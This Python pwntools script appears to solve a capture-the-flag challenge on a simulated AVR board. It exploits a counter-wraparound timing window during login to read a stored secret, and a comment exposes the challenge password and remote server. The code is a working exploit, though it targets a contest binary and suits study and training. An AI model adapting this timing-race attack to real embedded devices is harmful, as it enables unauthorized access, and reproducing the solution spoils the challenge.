from pwn import *
import string
import random
from multiprocessing import Pool

charset = string.printable.split("~")[0]

#pw1 = "doNOTl4unch_missi1es!"
#r = remote("avr.2020.ctfcompetition.com", 1337)

pw1 = "PASSWORD_REDACTED_XYZ"

def sice_deet(lol):
    r = process(["./simduino.elf", "./code.hex"], env={"LD_LIBRARY_PATH":"/root/files/avr/simavr/examples/board_simduino/../../simavr/obj-x86_64-linux-gnu/"})

    r.recvuntil("continue")
    r.recvline()
    r.send("\n")

    while True:
        try:
            r.recvuntil('Uptime: ')
            deet = int(r.recvline()[:-3])
            # print(deet)
            if 65535 - deet%(1<<16) < (1000+random.randint(-1000,1000)):
                r.recvuntil("Login: ")
                r.sendline("agent")
                r.recvuntil("Password: ")
                r.sendline(pw1)
                break

            r.recvuntil("Login: ")
            r.sendline("agent")
            r.recvuntil("Password: ")
            r.sendline("LLLL")
        except:
            r.close()
            return

    def rec():
        return r.recvuntil("Choice: ")
    rec()

    def store_secret(data):
        r.sendline("1")
        r.recvuntil(": ")
        r.sendline(data)
        rec()

    def read_secret():
        r.sendline("2")
        return rec()

    read_sec =  read_secret().split('---')[1].strip()
    r.close()
    if read_sec != """Operation SIERRA TANGO ROMEO:
Radio frequency: 13.37MHz
Received message: ATTACK AT DAWN""":
        print(read_sec)
        return True
    return False

pool = Pool(processes=16)
pool.map(sice_deet, range(256))

